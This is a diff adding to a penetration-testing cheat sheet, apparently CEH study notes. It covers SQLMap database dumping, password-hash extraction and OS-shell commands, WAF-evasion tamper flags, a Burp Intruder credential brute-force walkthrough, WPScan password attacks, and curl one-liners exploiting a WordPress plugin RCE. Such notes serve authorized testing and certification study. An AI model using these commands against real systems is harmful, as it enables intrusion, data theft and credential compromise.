@@ -929,6 +929,175 @@ ps
 migrate [PID]              # Migrate to SYSTEM process
 ```
 
+---
+
+## SQL Injection with SQLMap 
+
+### Getting the Cookie (Required for Authenticated Pages)
+
+**Steps:**
+1. Log into target website
+2. Navigate to vulnerable page (e.g. View Profile)
+3. Note the URL in address bar
+4. Right-click → **Inspect** → **Console** tab
+5. Type `document.cookie` → press Enter
+6. Copy the cookie value
+
+---
+
+### Basic Commands
+
+#### Test for Injection
+```bash
+sqlmap -u "http://target.com/page.aspx?id=1" --batch
+sqlmap -u "http://target.com/page.aspx?id=1" --cookie="[COOKIE]" --batch
+```
+
+#### Enumerate Databases
+```bash
+sqlmap -u "http://target.com/page.aspx?id=1" --cookie="[COOKIE]" --dbs
+```
+
+#### Enumerate Tables in Database
+```bash
+sqlmap -u "http://target.com/page.aspx?id=1" --cookie="[COOKIE]" -D [DATABASE] --tables
+```
+
+#### Dump Table Contents
+```bash
+sqlmap -u "http://target.com/page.aspx?id=1" --cookie="[COOKIE]" -D [DATABASE] -T [TABLE] --dump
+```
+
+#### Get OS Shell
+```bash
+sqlmap -u "http://target.com/page.aspx?id=1" --cookie="[COOKIE]" --os-shell
+# Then run: hostname, TASKLIST, whoami, etc.
+```
+
+---
+
+### Request Methods
+
+#### GET Parameter
+```bash
+sqlmap -u "http://target.com/page.php?id=1"
+```
+
+#### POST Data
+```bash
+sqlmap -u "http://target.com/page.php" --data="id=1"
+```
+
+#### JSON Body
+```bash
+sqlmap -u "http://target.com/page.php" --data='{"id": 1}'
+```
+
+#### Cookie Injection
+```bash
+sqlmap -u "http://target.com/page.php" --cookie="id=1*"
+```
+
+#### Raw Request File (Burp capture)
+```bash
+sqlmap -r request.txt --batch
+sqlmap -r request.txt --batch -D [DB] -T [TABLE] --dump
+```
+
+---
+
+### Database Enumeration Flags
+```bash
+--dbs                    # List all databases
+--tables                 # List tables in database
+--dump                   # Dump table contents
+--dump-all               # Dump all databases
+--dump-all --exclude-sysdbs  # Dump all except system DBs
+--schema                 # Retrieve structure of all tables
+--banner                 # Database version banner
+--current-user           # Current DB user
+--current-db             # Current database name
+--is-dba                 # Check if current user is DBA/admin
+--passwords              # Dump password hashes
+--hostname               # Target hostname
+
+# Specific column/row selection
+-D [DATABASE]            # Specify database
+-T [TABLE]               # Specify table
+-C [COLUMN1],[COLUMN2]   # Specify columns
+--start=2 --stop=3       # Specify rows by range
+--where="name LIKE 'f%'" # Conditional row selection
+
+# Search
+--search -T [KEYWORD]    # Search tables by keyword
+--search -C [KEYWORD]    # Search columns by keyword
+```
+
+---
+
+### Tuning & Performance
+```bash
+--level=5                # Test depth 1-5 (default 1)
+--risk=3                 # Risk level 1-3 (default 1)
+--threads=10             # Concurrent threads (speeds up blind injection)
+--time-sec=10            # Seconds to wait for time-based blind
+--flush-session          # Clear cached session data
+--no-cast                # Fix data type casting issues
+--hex                    # Use hex encoding for retrieval
+```
+
+**Level/Risk Guide:**
+| Setting | Payloads | Use When |
+|---------|----------|----------|
+| --level=1 --risk=1 | ~72 | Default, basic testing |
+| --level=5 --risk=3 | ~7,865 | Nothing else works |
+| --risk=3 | Enables OR payloads | Login pages, blind OR injections |
+
+---
+
+### WAF/IDS Evasion
+```bash
+--random-agent           # Random browser user-agent
+--tamper=space2comment   # Replace spaces with /**/
+--tamper=between         # Replace > with BETWEEN
+--tamper=randomcase      # Randomize SQL keyword casing
+--tamper=space2comment,between,randomcase  # Chain tampers
+--skip-waf               # Skip WAF heuristic detection
+--chunked                # Chunked transfer encoding
+--tor                    # Route through Tor network
+--proxy="socks4://[IP]:[PORT]"  # Route through proxy
+--check-tor              # Verify Tor is working
+```
+
+#### Anti-CSRF Token Bypass
+```bash
+--csrf-token="[TOKEN NAME]"  # Auto-fetch fresh CSRF tokens
+```
+
+#### Common Tamper Scripts
+| Tamper | What it Does |
+|--------|-------------|
+| `space2comment` | Replaces spaces with `/**/` |
+| `between` | Replaces `>` with `NOT BETWEEN 0 AND` |
+| `randomcase` | Randomizes SQL keyword casing |
+| `base64encode` | Base64 encodes payload |
+| `appendnullbyte` | Appends NULL byte to payload |
+
+```bash
+--list-tampers           # List all available tamper scripts
+```
+
+---
+
+### OS Shell Commands (After --os-shell)
+```bash
+hostname        # Machine name running web app
+whoami          # Current user
+TASKLIST        # Running processes (Windows)
+ipconfig        # Network info (Windows)
+ifconfig        # Network info (Linux)
+help            # List available commands
+```
 
 ---
 
@@ -950,6 +1119,14 @@ migrate [PID]              # Migrate to SYSTEM process
 ```
 IP: 127.0.0.1   Port: 8080
 ```
+
+#### Browser Proxy Setup (Required Before Using Burp)
+```
+Firefox → Settings → Search "proxy" → Network Settings → Manual proxy configuration
+HTTP Proxy: 127.0.0.1   Port: 8080
+Check: Also use this proxy for HTTPS → OK
+```
+**To disable after:** Connection Settings → select **No proxy** → OK
 
 #### Intercepting Requests
 ```
@@ -977,6 +1154,41 @@ Proxy → HTTP History → right-click request → Send to Repeater → Send
 set PROXIES HTTP:127.0.0.1:8080
 ```
 
+#### Brute Force Attack Flow
+
+**Step 1 — Intercept login request:**
+1. Enable intercept → **Intercept is on**
+2. Enter any credentials on login page → click **Log In**
+3. Request captured in Burp → right-click → **Send to Intruder**
+
+**Step 2 — Configure Positions:**
+```
+Intruder → Positions tab
+```
+1. Click **Clear §** to clear default payload markers
+2. Select **Cluster bomb** from Attack type dropdown
+3. Highlight username value → click **Add §**
+4. Highlight password value → click **Add §**
+
+**Step 3 — Load Wordlists:**
+```
+Intruder → Payloads tab
+```
+- Payload set **1** → Simple list → **Load** → select `username.txt`
+- Payload set **2** → Simple list → **Load** → select `password.txt`
+
+
+**Step 4 — Start Attack:**
+1. Click **Start Attack**
+2. Sort results by **Length** or **Status**
+3. Look for different Status/Length value — that's the valid credential
+4. **Status 302** + different Length = successful login
+
+**Step 5 — Turn off Intercept:**
+```
+Proxy → Intercept is on → click to toggle off
+```
+
 #### Intruder (Fuzzing)
 ```
 Proxy History → right-click → Send to Intruder
@@ -987,12 +1199,18 @@ Proxy History → right-click → Send to Intruder
 - **Settings tab** — Disable **Exclude HTTP Headers**
 - **Payload Processing** - Skip lines starting with `.` → Add → Skip if matches regex → `^\..*$`
 
+| Attack Type | Description |
+|-------------|-------------|
+| Sniper | Single payload set, one position at a time |
+| Battering Ram | Single payload set, all positions simultaneously |
+| Pitchfork | Multiple payload sets, iterates in parallel |
+| Cluster Bomb | Multiple payload sets, all combinations — use for brute force |
+
 | Payload Type | Description |
 |--------------|-------------|
 | Simple List | Basic wordlist — iterates each line |
 | Runtime File | Loads line by line — saves memory |
 | Character Substitution | Replaces characters with defined substitutions |
-
 
 ---
 
@@ -1064,6 +1282,15 @@ Attack → Spider → crawls site (passive scan)
 1. View **Sites Tree** in left pane
 2. Once populated → begin **Active Scan**
 
+**Quick Automated Scan:**
+```
+Quick Start tab → Automated Scan → enter URL → Attack
+```
+1. Enter target URL in **URL to attack** field
+2. Click **Attack**
+3. ZAP runs Spider + Active Scan automatically
+4. Results appear in **Alerts** tab when complete
+
 ---
 
 ### WPScan
@@ -1103,16 +1330,31 @@ wpscan --url http://[HOST or IP] --enumerate u,ap,at --detection-mode aggressive
 wpscan --url http://[HOST or IP] -U  -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64
 ```
 
+#### Remote Code Execution via Vulnerable Plugin
+Once WPScan identifies a vulnerable plugin (e.g. wp-upg):
+```bash
+# Check for vulnerable plugins
+wpscan --url http://[URL] --api-token [TOKEN]
+
+# Exploit RCE via wp-upg plugin
+curl -i 'http://[IP]:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'
+
+# Replace whoami with other commands
+curl -i 'http://[IP]:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:ipconfig:NULL:NULL'
+curl -i 'http://[IP]:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:TASKLIST:NULL:NULL'
+```
+
 #### Key Findings
 | Finding | What It Means |
 |---------|--------------|
 | WordPress version | Check for known CVEs |
 | XML-RPC enabled | Brute force via xmlrpc.php |
 | Upload dir listing | May expose uploaded files/shells |
-| robots.txt entries | Reveals hidden paths |
-| Outdated plugins | Most common attack vector |
+| robots.txt entries | Reveals hidden paths like /wp-admin/ |
+| Outdated plugins | Most common attack vector — check with API token |
 | Config backups | May contain DB credentials |
 | Users identified | Targets for password attack |
+| RCE in plugin | May allow OS command execution without auth |
 
 ---
 
